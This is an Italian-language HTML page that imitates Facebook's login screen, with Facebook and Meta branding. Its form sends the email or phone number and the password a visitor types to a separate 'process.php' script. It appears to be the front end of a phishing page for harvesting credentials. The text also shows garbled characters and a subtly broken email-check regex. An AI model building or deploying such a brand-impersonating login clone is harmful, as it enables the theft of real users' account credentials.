<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook - Accedi o registrati</title>

  <!-- Favicon Facebook -->
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/svg+xml" />

  <!-- Il tuo CSS -->
  <link rel="stylesheet" href="facebook.css" />
</head>
<body>
  <div class="fb-container">
    <img src="facebook.png" alt="Facebook logo" class="fb-logo" />

    <form action="process.php" method="POST" class="fb-form" autocomplete="on">
      <input type="text" name="email" placeholder="Email o numero di telefono" autocomplete="username" required />
      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
      <button type="submit">Accedi</button>
      <a href="#" class="forgot">Hai dimenticato la password?</a>
      <hr />
      <a href="#" class="create-account">Crea nuovo account</a>
    </form>

    <footer class="meta-footer">
      <img src="meta.png" alt="Meta logo" class="meta-logo" />
      <div class="meta-links">
        <a href="#">Informazioni</a> ¬∑ 
        <a href="#">Centro assistenza</a> ¬∑ 
        <a href="#">Altro</a>
      </div>
    </footer>
  </div>

  <!-- Validazione JavaScript -->
  <script>
    document.querySelector(".fb-form").addEventListener("submit", function(e) {
      const email = document.querySelector("input[name='email']").value.trim();
      const password = document.querySelector("input[name='password']").value.trim();
      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;

      if (email === "" || password === "") {
        alert("‚ö†Ô∏è Compila tutti i campi!");
        e.preventDefault();
        return;
      }

      if (!emailRegex.test(email)) {
        alert("üìß Inserisci un'email valida!");
        e.preventDefault();
        return;
      }
    });
  </script>
</body>
</html>
